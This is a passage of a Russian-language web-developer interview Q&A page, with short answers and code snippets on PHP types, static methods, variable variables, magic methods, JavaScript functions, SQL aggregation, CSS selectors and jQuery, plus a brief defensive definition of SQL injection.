style="font-size:18px">&mdash; СКОЛЬКО ТИПОВ ДАННЫХ В РНР?</span></h3>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">PHP поддерживает 10 базовых типов данных.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">4 скалярных типа:</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; boolean. Логический тип данных, переменные данного типа могут принимать значения true или false.</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; integer. Целочисленный тип данных, переменные могут принимать целые значения (&hellip;-2, -1, 0, 1, 2&hellip;) в диапазоне от -2^31 до +2^31. Если значение превышает данный порог &mdash; оно автоматически переводится в тип float.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; float. Числовой тип данных с плавающей точкой, может содержать как целые, так и дробные величины.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; string. Строковый тип данных. Содержит нефиксированное количество различных символов. PHP не накладывает никаких ограничений на длину строки, поэтому можно смело работать даже с ОЧЕНЬ большими строками.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">4 комплексных (составных) типа:</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; array. Массив, содержит упорядоченный список элементов.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; object. Объект, содержит некий объект (экземпляр класса).</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; callable. Функции обратного вызова (callback-функции).</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; iterable. Может использоваться как тип параметра для указания, что функция принимает набор значений, но ей не важна форма этого набора, пока он будет использоваться с foreach.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">2 специальных типа:</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; resource. Ссылка на абстрактный элемент, т.н. внешний ресурс. Примеры внешних ресурсов &mdash; ссылка на файл и ссылка на результат выполнения запроса.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&mdash; NULL. Пустой тип данных, обозначающий отсутствие какого-либо значения. О таких значениях обычно говорят &laquo;не определено&raquo;. Пустым значением можно инициализировать переменные любого другого типа.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЧТО ТАКОЕ STATIC ФУНКЦИЯ И ЧЕМ ОНА ОТЛИЧАЕТСЯ ОТ &laquo;ОБЫЧНОЙ&raquo; (НЕ STATIC)?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Static принадлежит классу, а не экземпляру класса. И вызывается у класса, а не у объекта, т.е. напрямую. Объявление свойств и методов класса статическими позволяет обращаться к ним без создания экземпляра класса. Атрибут класса, объявленный статическим, не может быть доступен посредством экземпляра класса (но статический метод может быть вызван). Так как статические методы вызываются без создания экземпляра класса, то псевдопеременная $this недоступна внутри метода, объявленного статическим. Доступ к статическим свойствам класса не может быть получен через оператор -&gt;.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЕСТЬ ЛИ РАЗНИЦА МЕЖДУ ОДИНАРНЫМИ И ДВОЙНЫМИ КАВЫЧКАМИ В PHP?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">В двойных кавычках данные &laquo;парсятся&raquo;, а в одинарных &ndash; нет. При двойных кавычках в данном случае выведется Chimay, а при одинарных &mdash; $beer.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$beer = &#39;Chimay&#39;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">echo &quot;$beer&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; НАПИСАТЬ ПРОГРАММУ, КОТОРАЯ ВЫВОДИТ ПРОСТЫЕ ЧИСЛА, Т.Е. ДЕЛЯЩИЕСЯ БЕЗ ОСТАТКА ТОЛЬКО НА СЕБЯ И НА 1.</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$lst = array();</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$k = &quot;prime&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">for ($i = 2; $i &lt; 100; $i++) {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; for ($j = 2; $j &lt; $i; $j++) {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; if (($i % $j) == 0) {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $k = &quot;not prime&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; }</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">if ($k == &quot;prime&quot;) $lst[] = $i;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">else $k = &quot;prime&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">foreach($lst as $list) echo $list . &quot;&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; НАПИШИ ПРОГРАММУ-ЦЕНЗОР, КОТОРАЯ БЫ ЗАМЕНЯЛА ВВОДИМЫЕ ПОЛЬЗОВАТЕЛЕМ В ФОРМУ СЛОВА &laquo;FUCK&raquo;, &laquo;IDIOT&raquo; И &laquo;BITCH&raquo; НА &laquo;F**K&raquo;, &laquo;ID**T&raquo; И &laquo;BI**H&raquo;.</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$find = array(</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &lsquo;fuck&rsquo;,</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &lsquo;idiot&rsquo;,</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &lsquo;bitch&rsquo;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$replace = array(</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lsquo;f * *k&rsquo;,</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lsquo;id * *t&rsquo;,</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp;&lsquo;bi * *h&rsquo;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">If (isset($_POST[&lsquo;user_input&rsquo;]) &amp;&amp; !empty($_POST[&lsquo;user_input&rsquo;])) {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; $user_input = $_POST[&lsquo;user_input&rsquo;];</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; $user_input_new = str_ireplace($find, $replace, $user_input);</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; echo $user_input_new;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЧТО ТАКОЕ ДИНАМИЧЕСКИЕ ПЕРЕМЕННЫЕ?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Динамической переменной считается та, имя которой хранится в самой переменной. Это так называемая &laquo;переменная переменная&raquo;. Например:</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$var = &quot;first&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$$var = &quot;Second&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">// $$var == $first == &quot;Second&quot;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$$var &mdash; динамическая, ее имя может меняться вместе с изменением $var. Также можно связать имя переменной с содержимым другой переменной неявно:</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$first = &quot;second&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$second = &quot;third&quot;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">print $first; // напечатает &quot;second&quot;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">print $$first; // напечатает &quot;third&quot;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЧТО ТАКОЕ ШАБЛОНЫ (ПАТТЕРНЫ) ПРОЕКТИРОВАНИЯ?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Паттерн проектирования &mdash; это общее типовое решение некоторой проблемы, многократно повторяемое в процессе проектирования архитектуры программного продукта. Они показывают отношения и взаимодействия между классами, позволяют сделать систему гибкой и легко изменяемой. За счет их правильного использования повышается коэффициент использования готовых решений.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; НАПИШИ ПРИМЕР РЕАЛИЗАЦИИ ПОЛИМОРФИЗМА.</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Class One</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">{</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; function foo()</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; echo &ldquo;Hellofromclass One!&rdquo;;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; }</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; function callMe()</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; $this-&gt;foo();</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; }</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Class Two extends One</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">{</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; function foo()</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;echo &ldquo;Hellofromclass Two&rdquo;;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; }</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$Two = new two();</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$Two-&gt;callMe();</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&nbsp;&mdash; КАКИЕ ЕЩЕ ЕСТЬ ПАРАДИГМЫ (МОДЕЛИ, ПОДХОДЫ) ПРОГРАММИРОВАНИЯ КРОМЕ ООП?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Из тех, что наиболее часто встречаются: функциональная, аспектно-ориентированная и процeдурная.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; НУЖНО АЛЕРТОМ ВЫВЕСТИ КАКОЕ-ТО СООБЩЕНИЕ, СПУСТЯ 3 СЕКУНДЫ ПОСЛЕ ЗАПУСКА СКРИПТА. КАК ЭТО СДЕЛАТЬ?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">setTimeout(function(){ alert(&quot;Hello&quot;); }, 3000);</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; РАССКАЖИТЕ ПАРУ СЛОВ ОБ ОБЪЕКТАХ В JAVASCRIPT</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Объекты (они же &mdash; ассоциативные массивы, хэши) и работа с ними в JavaScript реализованы не так, как в большинстве языков. Объект в JavaScript представляет собой обычный ассоциативный массив или, иначе говоря, &laquo;хэш&raquo;. Он хранит любые соответствия &laquo;ключ =&gt; значение&raquo; и имеет несколько стандартных методов.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЕСТЬ ДВЕ ФУНКЦИИ. ЕСТЬ ЛИ МЕЖДУ НИМИ РАЗНИЦА? ЕСЛИ ЕСТЬ, ТО КАКАЯ?</span></h3>\r\n\r\n<h3><span style="font-size:18px">FUNCTION F(A,B) { RETURN A+B }</span></h3>\r\n\r\n<h3><span style="font-size:18px">И</span></h3>\r\n\r\n<h3><span style="font-size:18px">VAR F = FUNCTION(A,B) { RETURN A+B }</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Разница есть &mdash; она заключается в видимости функции. Вариант функции без var виден везде в текущей области видимости. В том числе и до самого определения функции. Вариант с var присваивает функцию переменной, поэтому такая функция видна только после определения.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЧТО CДЕЛАЕТ КОД: BREAK ME_BABY; ?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Выйдет из текущего блока цикла или switch на метку &laquo;me_baby&raquo;.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЧТО ТАКОЕ SQL-ИНЪЕКЦИЯ?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">SQL-инъекции &mdash; встраивание вредоносного кода в запросы к базе данных. С использованием SQL-инъекций злоумышленник может не только получить закрытую информацию из базы данных, но и, при определенных условиях, внести туда изменения. Уязвимость по отношению к SQL-инъекциям возникает из-за того, что пользовательская информация попадает в запрос к базе данных без должной обработки: чтобы скрипт не был уязвим, требуется убедиться, что все пользовательские данные попадают во все запросы к базе данных в экранированном виде.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ДОПУСТИМ, У ВАС ЕСТЬ ИНТЕРНЕТ-МАГАЗИН. СОСТАВЬТЕ ЗАПРОС, КОТОРЫЙ ПОКАЖЕТ, СКОЛЬКО ДЕНЕГ ПРИНЕС КАЖДЫЙ ОТДЕЛЬНО ВЗЯТЫЙ ПОКУПАТЕЛЬ В ОБЩЕЙ СЛОЖНОСТИ ЗА ВСЁ ВРЕМЯ СУЩЕСТВОВАНИЯ МАГАЗИНА.</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">SELECT customer_name, SUM(order_price)</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">FROM orders</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">GROUP BY customer_name;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; В ЧЕМ РАЗНИЦА МЕЖДУ ЗАПИСЬЮ #MY И .MY?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">#my &ndash; селектор ID.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">.my &ndash; селектор класса.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЧТО ТАКОЕ ПСЕВДОКЛАССЫ?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Псевдоклассы &mdash; это то, что обычно пишут после селектора через двоеточие, чтобы определить реакцию или состояние для данного селектора. Самые известные псевдоклассы &mdash; это :link, :hover, :visited и :active. Псевдоклассы обладают следующей структурой:</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">selector:pseudo class {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; property: value;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">т.е. нужно всего лишь поместить двоеточие между селектором и псевдоклассом.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">a.snowman:link {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; color: blue;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">a.snowman:visited {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; color: purple;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">a.snowman:active {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; color: red;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">a.snowman:hover {</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; text-decoration: none;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; color: blue;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">&nbsp; &nbsp; background-color: yellow;</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">}</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; НАЙТИ ВСЕ ЭЛЕМЕНТЫ DIV С КЛАССОМ ONE, А ТАКЖЕ ВСЕ ЭЛЕМЕНТЫ P С КЛАССОМ TWO, ЗАТЕМ ДОБАВИТЬ ИМ ВСЕМ КЛАСС THREE И ВИЗУАЛЬНО ПЛАВНО СПУСТИТЬ ВНИЗ.</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$(&ldquo;div.one&rdquo;).add(&ldquo;p.two&rdquo;).addClass(&ldquo;three&rdquo;).slideDown(&ldquo;slow&rdquo;);</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ВЫБРАТЬ DIV`Ы, У КОТОРЫХ НЕТ КЛАССА CLS</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">$(&lsquo;div:not(.cls)&rsquo;);</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&nbsp;&mdash; ЧТО ТАКОЕ DOCTYPE И ЗАЧЕМ ОН НУЖЕН?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">DOCTYPE &mdash; это определение типа документа (Document Type Definition (DTD)), правила, в соответствии с которыми осуществляется проверка конкретного документа (веб-страницы) XML или (X)HTML. Благодаря этой записи браузер определяет, какая в данном документе используется версия DTD. А нужен он для того, чтобы браузеры правильно отображали разметку документа. Если не указан DOCTYPE, то браузер будет добавлять &laquo;отсебятину&raquo;, причём каждый браузер будет добавлять свою &laquo;отсебятину&raquo;. В результате ни о какой кроссбраузерности не может и речи идти.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; ЧТО ТАКОЕ ENTITIES?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Entities &mdash; это комбинации знака &amp; и буквенного или цифрового кода после нее, предназначенные для замещения символов, которые не могут встречаться в &laquo;чистом&raquo; виде в HTML-тексте, например, символа &laquo;&lt;&raquo;.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">***</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<h3><span style="font-size:18px">&mdash; КАКИЕ МАГИЧЕСКИЕ МЕТОДЫ ЗНАЕШЬ? ЧТО ЭТО ВООБЩЕ ТАКОЕ?</span></h3>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Это методы, зарезервированные в php, которые начинаются с двойного подчеркивания &ldquo;__&rdquo;.</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">Список всех магических методов:</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__construct</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__destruct</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__call</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__callStatic</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__get</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__set</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__isset</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__unset</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__sleep</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__wakeup</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__toString</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__set_state</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__clone</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__construct и __destruct &mdash; самые популярные методы, которые реализуют базовые понятия объектно-ориентированного программирования: конструктор и деструктор;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__call, __callStatic, __get и __set &ndash; методы, связанные с перегрузкой обращений как к свойствам, так&nbsp;</span><span style="font-size:18px">и к методам. Методы __get() и __set() вызываются при установке и получении значения свойства,&nbsp;</span><span style="font-size:18px">а методы __call() и __callStatic &mdash; при вызове метода. Стоит заметить, что эти магические функции&nbsp;</span><span style="font-size:18px">будут вызываться только и исключительно в том случае, если запрошенные метод или свойство&nbsp;</span><span style="font-size:18px">не существуют;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__isset &mdash; метод, срабатывающий при вызове функций empty() или isset() на несуществующем</span></div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">или недоступном свойстве класса;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__unset &mdash; срабатывает при вызове функции unset() на несуществующем или недоступном свойстве класса;</span></div>\r\n\r\n<div style="box-sizing: border-box;">&nbsp;</div>\r\n\r\n<div style="box-sizing: border-box;"><span style="font-size:18px">__sleep и __wakeup &ndash; методы, которые вызываются только из функций serialize и unserialize со</span><span style="font-size:18px">ответственно. Метод __sleep будет вызван сразу при применении к объекту функции serialize, а&nbsp;</span><span style="font-size:18px">метод __wakeup &ndash; при применении unserialize. В настоящий момент методы применяются для сохранения текущего состояния системы с последующим восстановлением данного состояния&nbsp;</span><span style="font-size:18px">(например, коннект к базе);</span></div>\r\n\r\n<div 